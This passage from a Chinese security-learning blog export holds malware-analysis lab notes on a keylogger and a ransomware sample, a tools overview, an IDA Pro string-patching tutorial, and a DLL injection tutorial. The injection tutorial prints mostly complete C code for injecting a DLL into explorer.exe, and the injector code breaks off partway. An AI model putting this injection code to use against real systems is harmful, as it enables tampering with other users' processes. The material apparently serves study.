<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
</ul>
<p><img data-src='virustotal.png' width='700' align='center' alt='確定該檔案確實為惡意程式'></img></p>
<br>

<hr>
<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
<br>

<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools"></a>🛠️ Dynamic Analysis Tools</h4><ul>
<li><font size='3'>Procmon -&gt; 監控時間段的進程</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
<li>監控程式的行為</li>
</ul>
<p><img data-src='process-monitor-1.png' width='700' align='center' alt='smass.exe'></img></p>
<br>

<p><img data-src='kbdlog-dat.png' width='700' align='center' alt='kbdlog.dat'></img></p>
<br>

<hr>
<br>

<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
<li><font size='3'>在程式該目錄下建立一個 <code>kbdlog.dat</code> 的檔案，並時刻寫入鍵盤監控。</font></li>
<li><font size='3'>未發現異常的 <code>NetWork</code> 、 <code>AutoRun</code>。</font></li>
<li><font size='3'>終止 <code>smass.exe</code> 該進程並移除 <code>kbdlog.dat</code> 。</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
<li><font size='3'>暫無</font></li>
</ul>
<br>

<hr>
<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
<li><font size='3'> 暫無 </font></li>
</ul>
<br>]]></content>
      <categories>
        <category>analysis</category>
      </categories>
      <tags>
        <tag>analysis</tag>
        <tag>malware</tag>
        <tag>exe</tag>
      </tags>
  </entry>
  <entry>
    <title>【惡意軟體分析】- 08</title>
    <url>/posts/23304/</url>
    <content><![CDATA[<hr>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
</blockquote>
<font size='3'>
在本練習中，我們將對 smass.exe 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
</font>

<br>

<hr>
<span id="more"></span>

<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
<li><font size='3'>Linux Remnux ( Static Analysis )</font></li>
<li><font size='3'>Windows 11 ( Dynamic Analysis )</font></li>
<li><font size='3'>MD5：<code>07953773c8b4e9f84e87742915dfda47ac7f1553f0ab6f007fc2d4d1971d6f95</code></font></li>
</ul>
<hr>
<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
<br>

<h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
<li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
<li><font size='3'>Virustotal   → 查看執行檔</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-PEStudio"><a href="#1️⃣-PEStudio" class="headerlink" title="1️⃣ PEStudio"></a>1️⃣ PEStudio</h4><ul>
<li><font size='3'>針對檔案資訊進行初步查找</font></li>
</ul>
<p><img data-src='pe-studio-1.png' width='700' align='center' alt='確認檔案類型'></img></p>
<br>

<h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
</ul>
<p><img data-src='virustotal.png' width='700' align='center' alt='確定該檔案確實為惡意程式'></img></p>
<br>

<hr>
<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
<br>

<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools"></a>🛠️ Dynamic Analysis Tools</h4><ul>
<li><font size='3'>Procmon -&gt; 監控時間段的進程</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
<li>監控程式的行為</li>
</ul>
<p><img data-src='process-monitor-1.png' width='700' align='center' alt='smass.exe'></img></p>
<br>

<p><img data-src='kbdlog-dat.png' width='700' align='center' alt='kbdlog.dat'></img></p>
<br>

<hr>
<br>

<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
<li><font size='3'>在程式該目錄下建立一個 <code>kbdlog.dat</code> 的檔案，並時刻寫入鍵盤監控。</font></li>
<li><font size='3'>未發現異常的 <code>NetWork</code> 、 <code>AutoRun</code>。</font></li>
<li><font size='3'>終止 <code>smass.exe</code> 該進程並移除 <code>kbdlog.dat</code> 。</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
<li><font size='3'>暫無</font></li>
</ul>
<br>

<hr>
<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
<li><font size='3'> 暫無 </font></li>
</ul>
<br>]]></content>
      <categories>
        <category>analysis</category>
      </categories>
      <tags>
        <tag>analysis</tag>
        <tag>malware</tag>
        <tag>exe</tag>
      </tags>
  </entry>
  <entry>
    <title>【惡意軟體分析】 - 09 - 勒索</title>
    <url>/posts/39881/</url>
    <content><![CDATA[<hr>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
</blockquote>
<font size='3'>
在本練習中，我們將對 FlatWare.exe 惡意軟體進行靜態和動態分析，透過分析其樣本來了解其行為。
</font>

<br>

<hr>
<span id="more"></span>

<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
<li><p><font size='3'>Linux Remnux ( Static Analysis )</font></p>
</li>
<li><p><font size='3'>Windows 11 ( Dynamic Analysis )</font></p>
</li>
<li><p><a href='https://bazaar.abuse.ch/sample/f8d907099731ba448fef98c4b100265ac37dc57ff26917ff3699fc0060f91cab/' target='_blank'><font size='3' color='#33ccff'>FlatWare.exe</font></a></p>
</li>
<li><p><font size='3'>HASH256：<code>f8d907099731ba448fef98c4b100265ac37dc57ff26917ff3699fc0060f91cab</code></font></p>
</li>
</ul>
<hr>
<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
<br>

<h4 id="🛠️-Static-Analysis-Tools："><a href="#🛠️-Static-Analysis-Tools：" class="headerlink" title="🛠️ Static Analysis Tools："></a>🛠️ Static Analysis Tools：</h4><ul>
<li><font size='3'>PeStudio → 查看執行檔</font></li>
<li><font size='3'>Virustotal   → 查看執行檔</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-PeStudio"><a href="#1️⃣-PeStudio" class="headerlink" title="1️⃣ PeStudio"></a>1️⃣ PeStudio</h4><ul>
<li><font size='3'>mscoree.dll 主要用於啟動 .NET 應用程式，負責將 .NET 代碼轉換為機器碼執行。</font></li>
</ul>
<br>

<p><img data-src='pe-studio-1.png' width='700' align='center' alt='PeDtudio'></img></p>
<br>

<h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
</ul>
<br>

<p><img data-src='virustotal.png' width='700' align='center' alt='virustotal'></img></p>
<br>

<hr>
<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
<br>

<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools:"></a>🛠️ Dynamic Analysis Tools:</h4><ul>
<li><font size='3'>AutoRuns</font></li>
<li><font size='3'>ProcDot</font></li>
</ul>
<br>

<hr>
<br>

<h4 id="1️⃣-AutoRuns"><a href="#1️⃣-AutoRuns" class="headerlink" title="1️⃣ AutoRuns"></a>1️⃣ AutoRuns</h4><ul>
<li><font size='3'>檢查有無被加入常駐</font></li>
</ul>
<p><img data-src='autoruns-1.png' width='600' align='center' alt='AutoRuns'></img></p>
<br>



<h4 id="2️⃣-ProcDot"><a href="#2️⃣-ProcDot" class="headerlink" title="2️⃣ ProcDot"></a>2️⃣ ProcDot</h4><ul>
<li><font size='3'>圖形查看行為</font></li>
</ul>
<p><img data-src='dot-1.png' width='600' align='center' ></img></p>
<p><img data-src='dot-2.png' width='600' align='center'></img></p>
<br>

<hr>
<br>

<h3 id="🔥-示意-🔥"><a href="#🔥-示意-🔥" class="headerlink" title="🔥 示意 🔥"></a><font size='5' align='center'>🔥 示意 🔥</font></h3><br>

<p><img data-src='error-1.png' width='600' align='center' alt='運行'></img></p>
<br>

<p><img data-src='error-2.png' width='600' align='center' alt='明目張膽的提示'></img></p>
<br>

<p><img data-src='error-3.png' width='600' align='center' alt='權限被鎖'></img></p>
<br>


<hr>
<br>

<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
<li><font size='3'>感染後直接跳出視窗詢問是否重開，此時電腦已經遭到加密，故無論點選與否都來不及。</font></li>
<li><font size='3'>檢查到有被加入 Logon 常駐。</font></li>
</ul>
<br>

<hr>
<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
<li><font size='3'>暫無</font></li>
</ul>
<br>]]></content>
      <categories>
        <category>analysis</category>
      </categories>
      <tags>
        <tag>analysis</tag>
        <tag>malware</tag>
        <tag>exe</tag>
      </tags>
  </entry>
  <entry>
    <title>【惡意軟體分析】基礎概念篇</title>
    <url>/posts/42213/</url>
    <content><![CDATA[<hr>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
<p><font size='3'>轉職 ~~ 學習到 Malware Analysis 跟逆向分析的東西，把基礎概念與工具用途紀錄一下。</font></p>
</blockquote>
<hr>
<span id="more"></span>


<h2 id="📝-本篇說明紀錄兩個部分"><a href="#📝-本篇說明紀錄兩個部分" class="headerlink" title="📝 本篇說明紀錄兩個部分"></a><font size='3'>📝 本篇說明紀錄兩個部分</font></h2><ul>
<li>Analysis Environment</li>
<li>Analysis Step<ul>
<li>Static Analysis</li>
<li>Dynamic Analysis</li>
<li>Reverse Engineering</li>
</ul>
</li>
</ul>
<br>

<h2 id="📝-Analysis-Environment-分析環境"><a href="#📝-Analysis-Environment-分析環境" class="headerlink" title="📝 Analysis Environment ( 分析環境 )"></a>📝 Analysis Environment ( 分析環境 )</h2><hr>
<ul>
<li><font size='3'>最常見的就是 Windows ，大多的惡意程式都是針對 Windows 去設計。</font></li>
<li><font size='3'>Remux Linux 的版本，裡面預載許多常用到的分析工具。</font></li>
</ul>
<br>

<hr>
<h2 id="🔥-Analysis-Step-🔥"><a href="#🔥-Analysis-Step-🔥" class="headerlink" title="🔥 Analysis Step 🔥"></a><font size='5' align='center'>🔥 Analysis Step 🔥</font></h2><hr>
<br>


<h3 id="📝-Analysis-Analysis"><a href="#📝-Analysis-Analysis" class="headerlink" title="📝 Analysis Analysis"></a><font size='5'>📝 Analysis Analysis</font></h3><hr>
<ul>
<li><font size='3'>不執行的去分析惡意程序的內容，針對 Windows 的話可以用下列工具</font><ul>
<li><font size='3'><code>PE Studio</code> ：可以初步的做分析，查看 PE 資訊與 檔案的 strings。</font></li>
<li><font size='3'><code>IDA</code> ：逆向標配，可以查看 assembly，需有組合語言的能力。</font></li>
<li><font size='3'><code>Ghidra</code></font></li>
<li><font size='3'><code>PE Bear</code> &#x2F;  <code>PE View</code> ：可以針對 PE 檔案格式做深入研究。</font></li>
<li><font size='3'><code>oledump.py</code> ：針對 Office 格式 ( Word, Excel ) 分析裡面的 Macro。</font></li>
<li><font size='3'><code>pdf-parser.py</code> ：針對 PDF 格式分析裡面的 Object。</font></li>
</ul>
</li>
</ul>
<br>


<h3 id="📝-Dynamic-Analysis"><a href="#📝-Dynamic-Analysis" class="headerlink" title="📝 Dynamic Analysis"></a><font size='5' >📝 Dynamic Analysis</font></h3><hr>
<ul>
<li><font size='3'>靜態分析完了之後想驗證自己的想法，可以使用動態分析</font></li>
<li><font size='3'>動態分析方法比較多種，但大致可以分成自動跟手動</font><ul>
<li><font size='3'><code>Cuckoo</code> ：沙盒標配，資料相當完整，但偶而會被Anti-debug&#x2F;analysis的招式抓到直接不執行。</font></li>
<li><font size='3'><code>ANY.RUN </code> ：可以直接跟沙盒內的 Windows VM 做互動。</font></li>
</ul>
</li>
</ul>
<br>

<ul>
<li><font size='3'>執行後去分析惡意程序的內容，針對 Windows 的話可以用下列工具</font><ul>
<li><font size='3'><code>Process Hacker</code> ：記錄所有執行中的程式以及詳細內容 (Mutex, process handle…..) 一邊執行一邊看著，通常可以很好發現 Process Injection 的特徵。</font></li>
<li><font size='3'><code>Process Explorer</code> ：記錄所有API Usage，但建議搭配視覺化工具像是ProcDOT。</font></li>
<li><font size='3'><code>Wireshark</code> ：記錄所有網路封包。</font></li>
<li><font size='3'><code>RegShot</code> ：對 Registry 做快照，通常在執行前與後進行快照，然後對比看是否有被修改。</font></li>
<li><font size='3'><code>x64dbg</code> ：惡意程式分析、破解（Cracking）、程式錯誤診斷。</font></li>
</ul>
</li>
</ul>
<!-- INetSim - 在封閉的網路可以充當Server，支援各大常見protocol，已經內建在REMnux裡面。
Apate DNS - 可以搭配 REMnux做使用，把所有網路Traffic都導向REMnux，並搭配INetSim做使用
Fiddler - 超好用的Web proxy, 不用特別設定，就算在封閉環境內也可以看到未成功發出的Web request
WinDBG  - Kernal mode debugger 
dnSpy - 針對.NET的逆向工具，包含靜態跟動態分析功能 -->

<br>


<h3 id="📝-Reverse-Engineering"><a href="#📝-Reverse-Engineering" class="headerlink" title="📝 Reverse Engineering"></a><font size='5' >📝 Reverse Engineering</font></h3><hr>
<ul>
<li><font size='3'> 從已編譯的程式碼回溯分析其內部運作方式 的技術</font></li>
<li><font size='3'>分析惡意程式（Malware Analysis）：找出病毒、木馬、勒索軟體的攻擊行為。</font></li>
<li><font size='3'>破解軟體（Software Cracking）：繞過軟體授權、DRM、序號驗證。</font></li>
<li><font size='3'>安全性分析（Security Research）：發現應用程式的漏洞（Exploit Development）。</font></li>
<li><font size='3'>修復舊軟體（Legacy Software Maintenance）：當源碼遺失時，還原程式運作邏輯。</font></li>
<li><font size='3'>常用逆向工程工具</font><ul>
<li><font size='3'><code>IDA Pro</code> ：最強靜態分析、互動式反組譯	。</font></li>
<li><font size='3'><code>Ghidra</code> ：NSA 開源逆向工具，支援多架構。</font></li>
<li><font size='3'><code>RetDec</code> ：開源反編譯工具，可還原 C 程式碼</font></li>
</ul>
</li>
</ul>
<br>

<hr>
<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
<li><font size='3'> <a href="https://pentestwriteup.blogspot.com/2020/08/blog-post.html">惡意程式分析 - 常用工具篇</a> </font></li>
</ul>
]]></content>
      <categories>
        <category>analysis</category>
      </categories>
      <tags>
        <tag>analysis</tag>
        <tag>malware</tag>
        <tag>base</tag>
      </tags>
  </entry>
  <entry>
    <title>【IDA PRO】程式解構 - Hello World - 01</title>
    <url>/posts/60293/</url>
    <content><![CDATA[<hr>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
<p><font size='3'>這篇文章紀錄 <code>IDA PRO</code> 軟體，分析 <code>Hello World</code> 的過程。</font></p>
</blockquote>
<font size='3'>
在本練習中，我們將對 Hello.exe 檔案進行分析、修改的行為。
</font>

<hr>
<span id="more"></span>


<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
<li><font size='3'>Windows 11 ( IDA PRO )</font></li>
</ul>
<hr>
<h5 id="🛠️-Static-Analysis-Tools："><a href="#🛠️-Static-Analysis-Tools：" class="headerlink" title="🛠️ Static Analysis Tools："></a>🛠️ Static Analysis Tools：</h5><ul>
<li><font size='3'>IDA PRO</font></li>
<li><font size='3'><code>非必須</code> Docker ( 準備 hello world 代碼 ) </font></li>
</ul>
<hr>
<br>

<h3 id="1-📝-Hello-World-程序"><a href="#1-📝-Hello-World-程序" class="headerlink" title="1. 📝 Hello World !! 程序"></a><font size='5'>1. 📝 Hello World !! 程序</font></h3><ul>
<li><font size='3'>建立 <code>hello.c</code> 檔案</font></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    printf(&quot;Hello, World!!&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><font size='3'>使用 Docker 指令</font></li>
</ul>
<p><img data-src='docker-1.png' align='center' alt='docker 編譯'></img></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用 Docker 對該資料進行映射，映射後資料夾全部內容都會被拉進容器內</span><br><span class="line">docker run --rm -it -v .:/work -w /work gcc:latest bash</span><br><span class="line"></span><br><span class="line"># 在容器內安裝 MinGW</span><br><span class="line">apt update &amp;&amp; apt install -y mingw-w64</span><br><span class="line"></span><br><span class="line"># 對 hello.c 進行編譯</span><br><span class="line">x86_64-w64-mingw32-gcc hello.c -o hello.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<ul>
<li><font size='3'>查看執行結果是否正常</font></li>
</ul>
<p><img data-src='hello.png' align='center' alt='Hello World'></img></p>
<br>

<hr>
<br>

<h3 id="2-📝-IDA-PRO-Analysis"><a href="#2-📝-IDA-PRO-Analysis" class="headerlink" title="2. 📝 IDA PRO Analysis"></a><font size='5'>2. 📝 IDA PRO Analysis</font></h3><ul>
<li><font size='3'>使用 IDA PRO 打開 exe</font></li>
</ul>
<p><img data-src='ida-1.png' width='600' align='center' alt='Open IDA'></img></p>
<br>

<ul>
<li><font size='3'>至 Strings 找到 Hello World 字樣 ( <code>Shift + F12</code> ) </font></li>
</ul>
<p><img data-src='ida-2.png' width='600' align='center' alt='IDA Strings'></img></p>
<p><img data-src='ida-3.png' width='600' align='center' alt='Found Hello Word'></img></p>
<p><img data-src='ida-4.png' width='600' align='center' alt='找到字樣後點選進去，選擇 hex dump'></img></p>
<p><img data-src='ida-5.png' width='600' align='center' alt='選擇編輯，並將替換的編碼輸入進去'></img></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># IDA PRO Test</span><br><span class="line">49 44 41 20 50 52 4F 20 54 65 73 74 00</span><br></pre></td></tr></table></figure>

<p><img data-src='ida-6.png' width='600' align='center' alt='確認文字變更後，儲存並測試'></img></p>
<p><img data-src='cmd-1.png' width='600' align='center' alt='🚀 確認無誤 🚀'></img></p>
<br>

<hr>
<br>

<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
<li><font size='3'>透過本次的練習，我們成功利用 IDA Pro 找到並修改可執行檔案 (hello.exe) 內的字串，將 “Hello, World!” 替換為 “IDA PRO Test”。</font></li>
</ul>
<br>

<hr>
<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
<li><font size='3'> <a href="https://blog.csdn.net/Onlyone_1314/article/details/108697155">IDA修改exe并保存运行</a> </font></li>
<li><font size='3'> <a href="https://yujiewong.github.io/2017/03/28/%E7%AC%AC2%E7%AB%A0-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90Hello-World-%E7%A8%8B%E5%BA%8F/">逆向分析Hello World! 程序</a> </font></li>
</ul>
<br>]]></content>
      <categories>
        <category>analysis</category>
      </categories>
      <tags>
        <tag>Tool</tag>
        <tag>IDA PRO</tag>
        <tag>Analysis</tag>
        <tag>Crack</tag>
      </tags>
  </entry>
  <entry>
    <title>【DLL Injection】注入攻擊 - 01</title>
    <url>/posts/33174/</url>
    <content><![CDATA[<hr>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
<p><font size='3'>這篇文章紀錄關於 <code>DLL Injection</code> 的攻擊手法，實際建一個惡意程式來理解過程。</font></p>
</blockquote>
<font size='3'>
在本練習中，我們將針對 Explorer.exe ( 檔案總管 ) ，進行注入並打開 CMD 的簡單行為。
</font>

<hr>
<span id="more"></span>


<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
<li><font size='3'>Windows Server 2025</font></li>
<li><font size='3'> Docker ( Build exe &amp; dll ) ， <code>非必須</code></font></li>
</ul>
<hr>
<br>

<h4 id="1️⃣-建立-injected-dll"><a href="#1️⃣-建立-injected-dll" class="headerlink" title="1️⃣ 建立 injected.dll "></a><font size='5'>1️⃣ 建立 injected.dll </font></h4><ul>
<li><font size='3'>建立 <code>injected.c</code> 檔案</font></li>
</ul>
<figure class="highlight plaintext"><figcaption><span><windows.h></span></figcaption><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI ThreadFunc(LPVOID lpParam)</span><br><span class="line">&#123;</span><br><span class="line">    MessageBoxA(NULL, &quot;Thread started inside explorer.exe&quot;, &quot;Debug&quot;, MB_OK);</span><br><span class="line"></span><br><span class="line">    while (1)</span><br><span class="line">    &#123;</span><br><span class="line">        STARTUPINFO si;</span><br><span class="line">        PROCESS_INFORMATION pi;</span><br><span class="line">        ZeroMemory(&amp;si, sizeof(si));</span><br><span class="line">        si.cb = sizeof(si);</span><br><span class="line"></span><br><span class="line">        si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">        si.wShowWindow = SW_SHOWNORMAL;</span><br><span class="line"></span><br><span class="line">        ZeroMemory(&amp;pi, sizeof(pi));</span><br><span class="line"></span><br><span class="line">        BOOL ret = CreateProcessA(</span><br><span class="line">            &quot;C:\\Windows\\System32\\cmd.exe&quot;,</span><br><span class="line">            &quot;/K echo HelloFromDLL &amp;&amp; pause&quot;,</span><br><span class="line">            NULL,</span><br><span class="line">            NULL,</span><br><span class="line">            FALSE,</span><br><span class="line">            0,</span><br><span class="line">            NULL,</span><br><span class="line">            NULL,</span><br><span class="line">            &amp;si,</span><br><span class="line">            &amp;pi</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        if (!ret)</span><br><span class="line">        &#123;</span><br><span class="line">            DWORD err = GetLastError();</span><br><span class="line">            char buf[256];</span><br><span class="line">            wsprintfA(buf, &quot;CreateProcess failed, error: %lu&quot;, err);</span><br><span class="line">            MessageBoxA(NULL, buf, &quot;Error in ThreadFunc&quot;, MB_OK | MB_ICONERROR);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            CloseHandle(pi.hProcess);</span><br><span class="line">            CloseHandle(pi.hThread);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Sleep(5000);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)</span><br><span class="line">&#123;</span><br><span class="line">    if (ul_reason_for_call == DLL_PROCESS_ATTACH)</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBoxA(NULL, &quot;DLL_PROCESS_ATTACH in explorer.exe&quot;, &quot;Debug&quot;, MB_OK);</span><br><span class="line"></span><br><span class="line">        DisableThreadLibraryCalls(hModule);</span><br><span class="line">        CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<h4 id="2️⃣-建立-injector-exe"><a href="#2️⃣-建立-injector-exe" class="headerlink" title="2️⃣ 建立 injector.exe "></a><font size='5'>2️⃣ 建立 injector.exe </font></h4><ul>
<li><font size='3'>建立 <code>injector.c</code> 檔案</font></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// injector.c</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;tlhelp32.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">// 尋找指定進程名稱，回傳 PID (0 表示找不到)</span><br><span class="line">DWORD FindProcessId(const char* processName)</span><br><span class="line">&#123;</span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line">    pe.dwSize = sizeof(PROCESSENTRY32);</span><br><span class="line"></span><br><span class="line">    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);</span><br><span class="line">    if (hSnapshot == INVALID_HANDLE_VALUE)</span><br><span class="line">        return 0;</span><br><span class="line"></span><br><span class="line">    DWORD pid = 0;</span><br><span class="line">    if (Process32First(hSnapshot, &amp;pe))</span><br><span class="line">    &#123;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">            // 不分大小寫比對可執行檔名稱</span><br><span class="line">            if (_stricmp(pe.szExeFile, processName) == 0)</span><br><span class="line">            &#123;</span><br><span class="line">                pid = pe.th32ProcessID;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; while (Process32Next(hSnapshot, &amp;pe));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CloseHandle(hSnapshot);</span><br><span class="line">    return pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // 1. 避免亂碼輸出：將輸出編碼設為 UTF-8</span><br><span class="line">    SetConsoleOutputCP(CP_UTF8);</span><br><span class="line"></span><br><span class="line">    // 2. 檢查 explorer.exe 是否已存在</span><br><span class="line">    DWORD pid = FindProcessId(&quot;explorer.exe&quot;);</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    ZeroMemory(&amp;pi, sizeof(pi));</span><br><span class="line"></span><br><span class="line">    if (pid == 0)</span><br><span class="line">    &#123;</span><br><span class="line">        // 若沒找到，啟動新的 explorer.exe</span><br><span class="line">        STARTUPINFO si;</span><br><span class="line">        ZeroMemory(&amp;si, sizeof(si));</span><br><span class="line">        si.cb = sizeof(si);</span><br><span class="line"></span><br><span class="line">        // 參考記憶點：若想最小化啟動，可設置：</span><br><span class="line">        // si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">        // si.wShowWindow = SW_SHOWMINIMIZED;</span><br><span class="line"></span><br><span class="line">        if (!CreateProcessA(</span><br><span class="line">            &quot;C:\\Windows\\explorer.exe&quot;, </span><br><span class="line">            NULL,</span><br><span class="line">            NULL,</span><br><span class="line">            NULL,</span><br><span class="line">            FALSE,</span><br><span class="line">            0,</span><br><span class="line">            NULL,</span><br><span class="line">            NULL,</span><br><span class="line">            &amp;si,</span><br><span class="line">            &amp;pi</span><br><span class="line">        ))</span><br><span class="line">        &#123;</span><br><span class="line">            DWORD err = GetLastError();</span><br><span class="line">            printf(&quot;無法啟動 explorer.exe，錯誤碼: %lu\n&quot;, err);</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 取得新的 explorer.exe PID</span><br><span class="line">        pid = pi.dwProcessId;</span><br><span class="line">        // 稍作等待讓 explorer.exe 初始化</span><br><span class="line">        Sleep(1000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 3. 打開 explorer.exe 進程</span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    if (!hProcess)</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD err = GetLastError();</span><br><span class="line">        printf(&quot;OpenProcess 失敗，錯誤碼: %lu\n&quot;, err);</span><br><span class="line">        return 1;</span><br><span class="line">    